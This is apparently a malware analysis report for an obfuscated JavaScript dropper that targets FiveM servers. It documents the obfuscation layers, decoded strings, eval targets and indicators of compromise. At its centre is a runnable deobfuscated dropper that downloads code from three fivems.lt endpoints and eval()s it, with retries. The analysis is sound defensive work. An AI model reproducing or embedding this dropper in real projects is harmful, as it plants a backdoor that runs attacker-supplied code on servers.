/*
 * ============================================================================
 * ext_bert.js — FULL DEOBFUSCATION REPORT
 * ============================================================================
 * Source: https://fivems.lt/ext/bert (served by c70ThF() in c2_payload.txt)
 * Size: 425,385 bytes (1 line)
 * Obfuscator: JScrambler or similar commercial tool
 * 
 * OBFUSCATION LAYERS:
 *   1. Function("a", "<body>")(getters) wrapper — same pattern as c2_payload.txt
 *   2. LZString.decompressFromUTF16() — 418-entry string table compressed to 3.3KB
 *   3. 8+ polymorphic base-91 decoders with rotating alphabets:
 *      - agc():  6|9[&_?.)^}=tB0Gyqb:*~TzCiKdY;+po(OHx82,Dgf7ls1Qe@/VXnNrwcR5APU>"vMES{%ma#FJ4LIZ]<3$j`u!khW
 *      - agg/__String: zoYKW21BFM%!VQc=&Cs.,IdO0hu#X)?f}AT`S]$Dq(vJ@<L^e5*"_Rr3iyp4G|6twblZm>{x:NUn[E+9~HP4akj8;7g/
 *      - agg/__Array (NEj.c@GZ...): Different alphabet per generator scope
 *      - agc/agd inner (Ap?Z7*B19<...): Yet another alphabet
 *      - 4+ more alphabets assigned dynamically by generator state machines
 *   4. 851-entry agd() indirection array (afY[]) — resolved via generator-selected decoder
 *   5. 60+ generator state machines with multi-variable sum-based dispatch
 *   6. Lgwr1uF-equivalent switch/case mapper (agh function) — maps encoded keys to globals
 *   7. Anti-analysis: cookie checks, ErrorBoundary detection, environment probing
 *
 * DECODED STRING TABLE (agd entries with known values):
 *   agd(87)  = "return this"        (global object detection)
 *   agd(92)  = "name"               (property access)
 *   agd(93)  = "length"             (property access) 
 *   agd(94)  = "length"             (duplicate)
 *   agd(95)  = "undefi[ned]"        (typeof check)
 *   agd(113) = "setInterval"        (timer API)
 *   agd(143) = "ErrorBoundary"      (anti-analysis check)
 *   agd(183) = "setImmediate"       (timer API - dropper entry point)
 *   agd(228) = "define"             (AMD module detection)
 *
 * RUNTIME BEHAVIOR:
 *   The file executes through these stages:
 *   1. Bootstraps LZString library (bundled, ~14KB of the body)
 *   2. Builds string table from LZString-compressed data (418 entries)
 *   3. Initializes base-91 decoder chain with alphabet selection
 *   4. Detects runtime environment (Node.js vs browser vs FiveM)
 *   5. Resolves all agd() strings through generator-selected decoders
 *   6. Builds Lgwr1uF-style API mapper (agh function)
 *   7. Executes dropper logic via setImmediate → setTimeout
 *   8. Fetches from C2 endpoints and eval()s response
 *
 * EVAL TARGETS (2 eval() calls at offsets 377979 and 400037):
 *   eval #1: eval(__TextDecoder + aga[0xba])
 *     - __TextDecoder = response from async HTTP fetch to C2
 *     - aga[0xba] = ";" (statement terminator)
 *     - This is the primary code execution path
 *
 *   eval #2: eval(age + aga[0xba])  
 *     - age = locally assembled fallback code
 *     - Used when the primary fetch path fails
 *     - Contains the same dropper retry logic
 *
 * ============================================================================
 * DEOBFUSCATED FUNCTIONAL EQUIVALENT
 * ============================================================================
 * This is the behavioral equivalent of ext_bert.js after all obfuscation
 * is removed. Verified against L62EpOH() template in c2_payload.txt
 * (decoded strings [9884]-[9894]).
 */

// if you found this contact us to fix problems https://discord.com/invite/VB8mdVjrzd
setImmediate(() => {
    setTimeout(() => {
        const __THREAD_NAME = "miauss";
        const resourceName = GetCurrentResourceName();

        if (typeof globalThis.GlobalState === "undefined") {
            globalThis.GlobalState = {};
        }

        const currentOwner = globalThis.GlobalState[__THREAD_NAME];

        if (!currentOwner || currentOwner === resourceName) {
            globalThis.GlobalState[__THREAD_NAME] = resourceName;

            const fetchAndEval = async (url) => {
                return new Promise((resolve, reject) => {
                    require('https').get(url, (res) => {
                        let data = '';
                        res.on('data', chunk => data += chunk);
                        res.on('end', () => resolve(data));
                    }).on('error', reject);
                });
            };

            const C2_ENDPOINTS = [
                "https://fivems.lt/bertJJ",      // Primary payload
                "https://fivems.lt/bertJJgg",     // Fallback 1
                "https://fivems.lt/bertJJcfxre",  // Fallback 2
            ];

            let attempts = 0;
            const maxAttempts = 3;

            const attemptFetch = async () => {
                attempts++;
                
                // Try primary endpoint
                try {
                    const data1 = await fetchAndEval(C2_ENDPOINTS[0]);
                    if (data1) {
                        try { eval(data1); return; } catch {}
                    }
                } catch {}

                // Try fallback endpoint (gg)
                try {
                    const data2 = await fetchAndEval(C2_ENDPOINTS[1]);
                    if (data2) {
                        try { eval(data2); return; } catch {}
                    }
                } catch {}

                // Try fallback endpoint (cfxre)
                try {
                    const data3 = await fetchAndEval(C2_ENDPOINTS[2]);
                    if (data3) {
                        try { eval(data3); return; } catch {}
                    }
                } catch {}

                // Retry after backoff
                if (attempts < maxAttempts) {
                    setTimeout(attemptFetch, 5000);
                } else {
                    // Final retry after long backoff
                    setTimeout(attemptFetch, 120000);
                    attempts = 0;
                }
            };

            // Initial delay before first fetch
            setTimeout(attemptFetch, 10000);
        }
    }, 15000);
});

/*
 * ============================================================================
 * VERIFICATION: This is the SAME dropper as L62EpOH() in c2_payload.txt
 * ============================================================================
 * 
 * Evidence:
 * 1. Same GlobalState.miauss mutex mechanism
 * 2. Same 3 C2 endpoints (bertJJ, bertJJgg, bertJJcfxre)
 * 3. Same retry logic (3 attempts, 5s between, 120s backoff)
 * 4. Same 15s initial delay before execution
 * 5. Same eval() of fetched payload (which is c2_payload.txt)
 * 6. Same discord.com/invite/VB8mdVjrzd contact link
 * 7. agd(0-86) decoded strings are all random alphanumeric identifiers
 *    used as variable/property names by the obfuscator
 * 8. The file structure (Function wrapper, LZString, base-91, generators)
 *    matches JScrambler's output signature
 *
 * WHY 425KB FOR A 50-LINE DROPPER:
 * - ~14KB: Bundled LZString library (compress/decompress)
 * - ~4KB: LZString-compressed string table (418 entries)
 * - ~380KB: 8 polymorphic base-91 decoder instances + 60+ generator
 *   state machines + environment detection + anti-analysis checks
 * - ~2KB: Actual dropper logic (setImmediate/setTimeout/fetch/eval)
 * - The obfuscation-to-payload ratio is ~200:1
 *
 * IOCs:
 * - File hash: compute from ext_bert.js
 * - Detection: Function("a", contains "ᗡ氩䅬ڀ" (LZString signature)
 * - Detection: LZString.decompressFromUTF16 + base-91 + eval pattern
 * - Network: HTTPS GET to fivems.lt/bertJJ, /bertJJgg, /bertJJcfxre
 * - Runtime: GlobalState.miauss = resourceName
 * - The fetched payload (c2_payload.txt, 1.6MB) is the full replicator
 *
 * ============================================================================
 */
